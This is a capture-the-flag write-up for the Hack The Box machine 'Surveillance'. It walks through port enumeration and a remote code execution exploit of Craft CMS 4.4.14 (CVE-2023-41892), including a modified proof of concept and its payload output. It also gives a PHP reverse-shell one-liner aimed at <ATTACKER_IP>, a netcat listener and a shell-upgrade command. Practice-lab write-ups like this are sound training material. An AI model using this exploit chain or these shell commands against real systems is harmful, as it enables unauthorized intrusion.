# Initial Enumeration
I started of with a full Nmap scan using NmapAutomator.

```bash
./nmapAutomator.sh -H <TARGET_IP> -t All
```

## Ports and Services
|  Service  |  Port  |  Version  |
|-----------|--------|-----------|
|  SSH  | 22/tcp  |  OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) |
|  HTTP  | 80/tcp  |  nginx 1.18.0 (Ubuntu)  |

A web app with the domain `surveillance.htb` was discovered running on port 80.

# Web App Enumeration
The website on `http://surveillance.htb` is of a home security company.

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/c7b548fc-59ca-471c-a0af-d39e5a7dd24a)
 Once looking into the source code of the website, we discovered it was created using Craft CMS v4.4.14.

 # Foothold
 A quick Google search for Craft CMS v4.4.14 exploits, revealed [CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892), a vulnerability that allows Remote Code Execution. A [PoC](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) for this vulonerability was found, however some adjustments needed to be made for it to work on our target - adding the following condition before the return statement in `getTmpUploadDirAndDocumentRoot()`:

```python
if match1 is None:
        return "no value", match2.group(1)
```

Now that we have a working exploit, we can execute it and get RCE on the target as `www-data`:

```bash
┌─[✗]─[dana404@parrot]─[~/Documents/tmp/surveillance]
└──╼ $python3 exploit.py http://surveillance.htb
[-] Get temporary folder and document root ...
HTTP Request:
Method: POST
URL: http://surveillance.htb/
Headers: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36', 'Content-Length': '310', 'Content-Type': 'application/x-www-form-urlencoded'}
Body: action=conditions%2Frender&configObject%5Bclass%5D=craft%5Celements%5Cconditions%5CElementCondition&config=%7B%22name%22%3A%22configObject%22%2C%22as+%22%3A%7B%22class%22%3A%22%5C%5CGuzzleHttp%5C%5CPsr7%5C%5CFnStream%22%2C+%22__construct%28%29%22%3A%7B%22methods%22%3A%7B%22close%22%3A%22phpinfo%22%7D%7D%7D%7D
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Next, we will get a reverse shell by starting a Netcat Listener on our machine (`nc -lvnp 4444`), and executing the following command on the target:

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",4444);shell_exec("/bin/bash <&3 >&3 2>&3");'
```

Once we got the reverse shell, we will run the following command in order to upgrade our shell to a fully interactive one:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```
